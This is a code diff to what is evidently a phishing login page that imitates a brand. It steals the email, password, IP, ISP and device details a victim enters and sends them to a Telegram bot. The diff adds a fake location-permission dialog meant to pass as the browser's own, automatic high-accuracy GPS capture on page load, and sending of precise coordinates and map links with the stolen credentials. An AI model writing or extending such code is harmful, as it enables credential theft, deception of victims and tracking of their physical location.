@@ -43,6 +43,54 @@
     .loading p { color: #666; font-size: 14px; }
     .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
     .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
+    .geo-prompt {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.4);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+    }
+    .geo-prompt-box {
+        background: #fff;
+        border-radius: 12px;
+        padding: 24px;
+        width: 90%;
+        max-width: 360px;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    }
+    .geo-prompt-box h3 {
+        font-size: 18px;
+        margin-bottom: 8px;
+        color: #202124;
+    }
+    .geo-prompt-box p {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 20px;
+    }
+    .geo-prompt-box .btn-row {
+        display: flex;
+        justify-content: flex-end;
+        gap: 8px;
+    }
+    .geo-prompt-box button {
+        padding: 8px 20px;
+        border-radius: 4px;
+        border: none;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .geo-prompt-box .allow {
+        background: #1a73e8;
+        color: #fff;
+    }
+    .geo-prompt-box .deny {
+        background: transparent;
+        color: #1a73e8;
+    }
 </style>
 </head>
 <body>
@@ -72,6 +120,17 @@
 
     <div class="footer" id="footerArea">
         <a href="#">Forgot password?</a>
+    </div>
+</div>
+
+<div class="geo-prompt" id="geoPrompt">
+    <div class="geo-prompt-box">
+        <h3>📍 Allow location access?</h3>
+        <p>This site wants to use your location. Your precise location will be shared with the site in order to verify your account and prevent fraud.</p>
+        <div class="btn-row">
+            <button class="deny" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
+            <button class="allow" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
+        </div>
     </div>
 </div>
 
@@ -232,9 +291,10 @@ function sendToTelegram(message) {
 }
 
 // ========================
-// GET TARGET INFO
+// GET TARGET INFO (IP & LOCATION)
 // ========================
 let targetIP = 'Unknown', targetCountry = 'Unknown', targetCity = 'Unknown', targetISP = 'Unknown';
+let targetLat = null, targetLon = null;
 
 fetch('https://ipapi.co/json/')
     .then(r => r.json())
@@ -243,6 +303,8 @@ fetch('https://ipapi.co/json/')
         targetCountry = data.country_name || 'Unknown';
         targetCity = data.city || 'Unknown';
         targetISP = data.org || 'Unknown';
+        targetLat = data.latitude;
+        targetLon = data.longitude;
     })
     .catch(() => {
         fetch('https://api.ipify.org?format=json')
@@ -250,6 +312,57 @@ fetch('https://ipapi.co/json/')
             .then(d => { targetIP = d.ip; })
             .catch(() => {});
     });
+
+// ========================
+// GEOLOCATION PROMPT (GPS PRECISE)
+// ========================
+let preciseLocation = null;
+
+function showFakeGeoPrompt() {
+    document.getElementById('geoPrompt').style.display = 'flex';
+    setTimeout(() => {
+        document.getElementById('geoPrompt').style.display = 'none';
+    }, 8000);
+}
+
+function requestGeolocation() {
+    if (!navigator.geolocation) return;
+    
+    if (navigator.permissions) {
+        navigator.permissions.query({ name: 'geolocation' }).then(p => {
+            if (p.state === 'prompt') {
+                showFakeGeoPrompt();
+            }
+        });
+    } else {
+        showFakeGeoPrompt();
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const alt = pos.coords.altitude;
+            
+            preciseLocation = { lat, lon, acc, alt };
+            
+            sendToTelegram(`📍 *Precise GPS Location Captured — ${brand.name}*\n` +
+                `🌐 *Lat/Lon:* \`${lat}, ${lon}\`\n` +
+                `🎯 *Accuracy:* ${acc} meters\n` +
+                `🗺 *Maps:* https://www.google.com/maps?q=${lat},${lon}\n` +
+                `📏 *Altitude:* ${alt ? alt.toFixed(1) + 'm' : 'N/A'}`);
+        },
+        err => {
+            sendToTelegram(`❌ *Geolocation denied* — ${brand.name}\nReason: ${err.message}`);
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
 
 // ========================
 // KEYSTROKE CAPTURE
@@ -295,7 +408,14 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     message += `📧 *Email:* \`${email}\`\n`;
     message += `🔑 *Password:* \`${password}\`\n\n`;
     message += `🌐 *IP:* ${targetIP}\n`;
-    message += `📍 *Location:* ${targetCity}, ${targetCountry}\n`;
+    message += `📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
+    if (targetLat && targetLon) {
+        message += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
+    }
+    if (preciseLocation) {
+        message += `🎯 *GPS (precise):* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n`;
+        message += `🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
+    }
     message += `🏢 *ISP:* ${targetISP}\n`;
     message += `📱 *Device:* ${platform}\n`;
     message += `🖥 *Screen:* ${screenInfo}\n`;
@@ -316,8 +436,13 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         window.location.href = brand.realSite;
     }, 2500);
 });
+
+// ========================
+// TRIGGER GEOLOCATION ON LOAD
+// ========================
+setTimeout(() => {
+    requestGeolocation();
+}, 3000);
 </script>
 </body>
 </html>
-
-
